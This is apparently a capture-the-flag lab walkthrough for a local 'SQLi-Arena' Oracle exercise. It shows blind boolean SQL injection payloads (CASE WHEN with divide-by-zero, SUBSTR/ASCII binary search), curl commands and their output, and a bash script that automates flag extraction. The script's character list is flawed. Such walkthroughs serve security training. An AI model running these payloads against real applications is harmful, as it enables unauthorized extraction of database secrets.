<h4>Step 1: Test Normal Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Article</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab6" \<br> --data-urlencode "id=1"<br><br>
        <span class="prompt">Input: </span>1<br>
        <span class="prompt">SQL: </span>SELECT title, content FROM articles WHERE id = 1 AND visible = 1<br><br>
        <span class="prompt">Output: </span><strong>Welcome to Our Blog</strong> -- This is the first post on our blog.
    </div>
</div>

<h4>Step 2: Confirm Blind Boolean Injection</h4>
<p>Errors are suppressed: only "Article found" or "Article not found" responses.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Boolean Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=1 AND 1=1"<br>
        <span class="prompt">Input: </span>1 AND 1=1<br>
        <span class="prompt">Result: </span><strong>Welcome to Our Blog</strong> / This is the first post on our blog. (TRUE -- article displayed)<br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=1 AND 1=2"<br>
        <span class="prompt">Input: </span>1 AND 1=2<br>
        <span class="prompt">Result: </span><strong>Article not found.</strong> (FALSE -- no result)<br>
        <span class="prompt">// Two different responses = boolean oracle</span>
    </div>
</div>

<h4>Step 3: Discover Hidden Table</h4>
<p>Use boolean conditions to enumerate tables blindly.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=1 AND (SELECT COUNT(*) FROM user_tables WHERE table_name='SECRETS')>0"<br>
        <span class="prompt">Input: </span>1 AND (SELECT COUNT(*) FROM user_tables WHERE table_name='SECRETS')>0<br>
        <span class="prompt">Result: </span><strong>Welcome to Our Blog</strong> (Article displayed -- SECRETS table exists!)<br>
        <span class="prompt">// Table: SECRETS confirmed (columns: ID NUMBER, SECRET VARCHAR2)</span>
    </div>
</div>

<h4>Step 4: CASE + Division by Zero Technique</h4>
<p>
    Oracle's <code>CASE WHEN condition THEN 1 ELSE 1/0 END</code> creates a reliable boolean oracle.
    TRUE = returns 1 (article shows). FALSE = divide-by-zero error (article not found).
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. CASE/DIVIDE Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab6" \<br> --data-urlencode "id=1 AND 1=(CASE WHEN SUBSTR((SELECT secret FROM secrets WHERE ROWNUM&lt;=1),1,1)='F' THEN 1 ELSE 1/0 END)"<br>
        <span class="prompt">Input: </span>1 AND 1=(CASE WHEN SUBSTR((SELECT secret FROM secrets WHERE ROWNUM&lt;=1),1,1)='F' THEN 1 ELSE 1/0 END)<br>
        <span class="prompt">Result: </span><strong>Welcome to Our Blog</strong> (TRUE -- first char is 'F')<br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=1 AND 1=(CASE WHEN SUBSTR((SELECT secret FROM secrets WHERE ROWNUM&lt;=1),1,1)='X' THEN 1 ELSE 1/0 END)"<br>
        <span class="prompt">Input: </span>1 AND 1=(CASE WHEN SUBSTR((SELECT secret FROM secrets WHERE ROWNUM&lt;=1),1,1)='X' THEN 1 ELSE 1/0 END)<br>
        <span class="prompt">Result: </span><strong>Article not found.</strong> (FALSE -- divide by zero triggered)
    </div>
</div>

<h4>Step 5: Extract Flag Character by Character</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Character Extraction (Verified)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Pos 1:  </span>SUBSTR(secret,1,1)='F'  -> <strong>Welcome to Our Blog</strong> (TRUE)<br>
        <span class="prompt">Pos 2:  </span>SUBSTR(secret,2,1)='L'  -> <strong>Welcome to Our Blog</strong> (TRUE)<br>
        <span class="prompt">Pos 3:  </span>SUBSTR(secret,3,1)='A'  -> <strong>Welcome to Our Blog</strong> (TRUE)<br>
        <span class="prompt">Pos 4:  </span>SUBSTR(secret,4,1)='G'  -> <strong>Welcome to Our Blog</strong> (TRUE)<br>
        <span class="prompt">Pos 5:  </span>SUBSTR(secret,5,1)='{'  -> <strong>Welcome to Our Blog</strong> (TRUE)<br>
        <span class="prompt">...     </span>(continue for all 24 characters)<br>
        <span class="prompt">Pos 24: </span>SUBSTR(secret,24,1)='}' -> <strong>Welcome to Our Blog</strong> (TRUE)<br><br>
        <span class="prompt">Result: </span><strong>FLAG{or_bl1nd_c4s3_d1v0}</strong>
    </div>
</div>

<h4>Step 6: Faster Extraction with Binary Search</h4>
<p>
    Use <code>ASCII(SUBSTR(...))</code> with greater-than/less-than for binary search.
    This reduces requests from ~36/char to ~7/char.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Binary Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1 AND (SELECT CASE WHEN ASCII(SUBSTR(secret,5,1))>100 THEN 1 ELSE 1/0 END FROM secrets WHERE ROWNUM&lt;=1)=1<br>
        <span class="prompt">Result: </span>Article displayed (ASCII > 100)<br><br>
        <span class="prompt">Input: </span>1 AND (SELECT CASE WHEN ASCII(SUBSTR(secret,5,1))>120 THEN 1 ELSE 1/0 END FROM secrets WHERE ROWNUM&lt;=1)=1<br>
        <span class="prompt">Result: </span>Article displayed (ASCII > 120)<br><br>
        <span class="prompt">Input: </span>1 AND (SELECT CASE WHEN ASCII(SUBSTR(secret,5,1))=123 THEN 1 ELSE 1/0 END FROM secrets WHERE ROWNUM&lt;=1)=1<br>
        <span class="prompt">Result: </span>Article displayed (ASCII 123 = '{')
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_bl1nd_c4s3_d1v0}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Script. Automated Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">#!/bin/bash</span><br>
        <span class="prompt">flag=""</span><br>
        <span class="prompt">for i in $(seq 1 30); do</span><br>
        &nbsp;&nbsp;<span class="prompt">for c in F L A G \{ \} _ a-z 0-9; do</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;<span class="prompt">r=$(curl -s "http://localhost/SQLi-Arena/oracle/lab6" \</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="prompt"> --data-urlencode "id=1 AND SUBSTR((SELECT secret FROM secrets WHERE ROWNUM&lt;=1),$i,1)='$c'")</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;<span class="prompt">echo "$r" | grep -q "Welcome" &amp;&amp; flag+="$c" &amp;&amp; break</span><br>
        &nbsp;&nbsp;<span class="prompt">done</span><br>
        <span class="prompt">done</span><br>
        <span class="prompt">echo "Flag: $flag"</span>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Oracle blind boolean injection uses <code>CASE WHEN ... THEN 1 ELSE 1/0 END</code>
    to create a boolean oracle via division-by-zero. Unlike MySQL's <code>IF()</code>, Oracle uses the
    standard SQL <code>CASE WHEN</code> syntax. Use <code>SUBSTR()</code> and <code>ASCII()</code> for
    character-by-character extraction. Binary search (comparing ASCII values with &gt;/&lt;) reduces requests
    from ~36/char to ~7/char. UNION doesn't work here because the <code>content</code> column is CLOB type,
    causing type mismatch errors. Defense: use bind variables and minimize behavioral differences between
    query success/failure.
</div>
